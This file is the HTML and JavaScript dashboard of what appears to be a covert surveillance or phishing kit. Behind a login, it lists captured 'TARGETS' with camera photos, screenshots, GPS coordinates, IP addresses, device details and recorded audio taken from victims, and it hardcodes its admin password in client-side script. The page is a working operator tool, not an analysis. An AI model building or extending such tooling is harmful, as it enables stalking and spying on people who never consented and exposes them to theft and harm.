<!DOCTYPE html>
<html>
<head>
    <title>🔐 ADMIN PANEL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Share Tech Mono',monospace; background:#0a0a0a; color:#00ff41; padding:20px; }
        .container { max-width:1200px; margin:auto; }
        
        .login-box {
            background:rgba(0,0,0,0.9);
            border:2px solid #00ff41;
            border-radius:10px;
            padding:40px;
            max-width:350px;
            margin:50px auto;
            text-align:center;
            box-shadow:0 0 40px rgba(0,255,65,0.1);
        }
        .login-box h2 { font-family:'Orbitron',monospace; font-size:18px; margin-bottom:20px; letter-spacing:3px; }
        .login-box input {
            width:100%; padding:12px; margin:10px 0;
            background:#0a0a0a; border:1px solid #00ff41; border-radius:5px;
            color:#00ff41; font-family:'Share Tech Mono',monospace;
            font-size:14px;
        }
        .login-box input:focus { outline:2px solid #00ff41; }
        .login-box button {
            width:100%; padding:12px;
            background:#00ff41; color:#0a0a0a;
            border:none; border-radius:5px;
            font-family:'Orbitron',monospace;
            font-size:16px; cursor:pointer;
            font-weight:bold;
            transition:0.3s;
        }
        .login-box button:hover { background:#00cc33; box-shadow:0 0 30px rgba(0,255,65,0.3); }
        .login-box .error { color:#ff0040; margin-top:10px; }
        
        .gallery { display:none; }
        header {
            display:flex;
            justify-content:space-between;
            align-items:center;
            flex-wrap:wrap;
            margin-bottom:20px;
            border-bottom:1px solid rgba(0,255,65,0.2);
            padding-bottom:15px;
        }
        h2 { font-family:'Orbitron',monospace; font-size:20px; letter-spacing:2px; }
        .stats { color:rgba(0,255,65,0.6); font-size:14px; }
        .stats span { color:#00ff41; font-size:22px; font-weight:bold; }
        .header-buttons { display:flex; gap:10px; flex-wrap:wrap; }
        .header-buttons button {
            padding:8px 18px;
            border:1px solid #00ff41;
            background:transparent;
            color:#00ff41;
            border-radius:5px;
            cursor:pointer;
            font-family:'Share Tech Mono',monospace;
            font-size:12px;
            transition:0.3s;
        }
        .header-buttons button:hover { background:rgba(0,255,65,0.1); box-shadow:0 0 20px rgba(0,255,65,0.1); }
        .header-buttons .logout { border-color:#ff0040; color:#ff0040; }
        .header-buttons .logout:hover { background:rgba(255,0,64,0.1); box-shadow:0 0 20px rgba(255,0,64,0.1); }
        
        .grid {
            display:grid;
            grid-template-columns:repeat(auto-fill,minmax(320px,1fr));
            gap:20px;
        }
        .card {
            background:rgba(0,0,0,0.8);
            border:1px solid rgba(0,255,65,0.15);
            border-radius:8px;
            overflow:hidden;
            transition:0.3s;
        }
        .card:hover { border-color:#00ff41; box-shadow:0 0 30px rgba(0,255,65,0.05); }
        .card .img-grid { display:grid; grid-template-columns:1fr 1fr; }
        .card .img-grid img { width:100%; height:140px; object-fit:cover; cursor:pointer; border-bottom:1px solid rgba(0,255,65,0.1); }
        .card .info { padding:12px; font-size:12px; }
        .card .info .time { color:rgba(0,255,65,0.4); font-size:11px; }
        .card .info .delete-btn {
            padding:5px 15px;
            border:1px solid #ff0040;
            background:transparent;
            color:#ff0040;
            border-radius:4px;
            cursor:pointer;
            font-size:11px;
            margin-top:8px;
            transition:0.3s;
        }
        .card .info .delete-btn:hover { background:rgba(255,0,64,0.1); box-shadow:0 0 20px rgba(255,0,64,0.1); }
        .card .info .badge {
            display:inline-block;
            padding:2px 10px;
            border-radius:3px;
            font-size:9px;
            background:rgba(0,255,65,0.1);
            border:1px solid rgba(0,255,65,0.2);
            color:#00ff41;
            margin-left:5px;
        }
        .loading, .no-data { text-align:center; padding:40px; font-size:18px; color:rgba(0,255,65,0.3); }
        .audio-player { margin-top:8px; padding:8px; background:rgba(0,0,0,0.5); border-radius:5px; }
        .audio-player audio { width:100%; height:25px; }
        .card .info .ip { color:#ffaa00; font-size:11px; }
        .card .info .location { color:#00ff41; font-size:12px; }
    </style>
</head>
<body>
<div class="container">

<div class="login-box" id="loginBox">
    <h2>🔐 ACCESS</h2>
    <input type="password" id="passwordInput" placeholder="ENTER PASSWORD" />
    <button onclick="login()">UNLOCK</button>
    <div class="error" id="loginError"></div>
</div>

<div class="gallery" id="gallery">
    <header>
        <div>
            <h2>📊 DATABASE</h2>
            <div class="stats">TARGETS: <span id="total">0</span></div>
        </div>
        <div class="header-buttons">
            <button class="logout" onclick="logout()">🚪 EXIT</button>
            <button onclick="loadData()">🔄 REFRESH</button>
        </div>
    </header>
    <div class="grid" id="grid"></div>
</div>

<script>
const PASSWORD = 'admin123#@!';

function login() {
    const pwd = document.getElementById('passwordInput').value;
    if (pwd === PASSWORD) {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('gallery').style.display = 'block';
        loadData();
    } else {
        document.getElementById('loginError').textContent = '⛔ ACCESS DENIED!';
    }
}

function logout() {
    document.getElementById('loginBox').style.display = 'block';
    document.getElementById('gallery').style.display = 'none';
    document.getElementById('passwordInput').value = '';
}

async function loadData() {
    const grid = document.getElementById('grid');
    const total = document.getElementById('total');
    grid.innerHTML = '<div class="loading">⏳ LOADING DATA...</div>';
    
    try {
        const res = await fetch('/api/admin/get-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD })
        });
        const data = await res.json();
        
        if (!data.success) {
            grid.innerHTML = '<div class="no-data">⛔ ' + data.message + '</div>';
            return;
        }
        
        total.textContent = data.count || 0;
        
        if (!data.data || data.data.length === 0) {
            grid.innerHTML = '<div class="no-data">📭 NO TARGETS ACQUIRED</div>';
            return;
        }
        
        grid.innerHTML = '';
        
        data.data.forEach(item => {
            const card = document.createElement('div');
            card.className = 'card';
            
            let audioHTML = '';
            if (item.audioData && item.audioData !== 'null') {
                audioHTML = `
                    <div class="audio-player">
                        <audio controls>
                            <source src="${item.audioData}" type="audio/webm">
                        </audio>
                    </div>
                `;
            }
            
            card.innerHTML = `
                <div class="img-grid">
                    <img src="${item.userPhoto || item.cameraImage || '#'}" onclick="window.open(this.src)" />
                    <img src="${item.screenshot || '#'}" onclick="window.open(this.src)" />
                </div>
                <div class="info">
                    <div class="location">📍 ${item.location?.lat?.toFixed(4) || 0}, ${item.location?.lng?.toFixed(4) || 0}</div>
                    <div class="time">🕐 ${new Date(item.timestamp).toLocaleString()}</div>
                    <div>📱 ${item.deviceDetails?.deviceName || 'Unknown'} <span class="badge">${item.deviceDetails?.os || ''}</span></div>
                    <div class="ip">📡 IP: ${item.ipAddress || 'Unknown'}</div>
                    <div>📱 Model: ${item.fullDeviceInfo?.deviceModel || item.deviceDetails?.deviceModel || 'Unknown'}</div>
                    <div>🏭 Manufacturer: ${item.fullDeviceInfo?.manufacturer || item.deviceDetails?.manufacturer || 'Unknown'}</div>
                    ${audioHTML}
                    <button class="delete-btn" onclick="deleteData('${item._id}')">🗑️ DELETE</button>
                </div>
            `;
            grid.appendChild(card);
        });
    } catch(err) {
        grid.innerHTML = '<div class="no-data">❌ ERROR: ' + err.message + '</div>';
    }
}

async function deleteData(id) {
    if (!confirm('🗑️ CONFIRM DELETE?')) return;
    try {
        await fetch('/api/admin/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD, id })
        });
        loadData();
    } catch(err) {
        alert('❌ ERROR: ' + err.message);
    }
}

document.getElementById('passwordInput').addEventListener('keypress', e => {
    if (e.key === 'Enter') login();
});
</script>
</body>
</html>
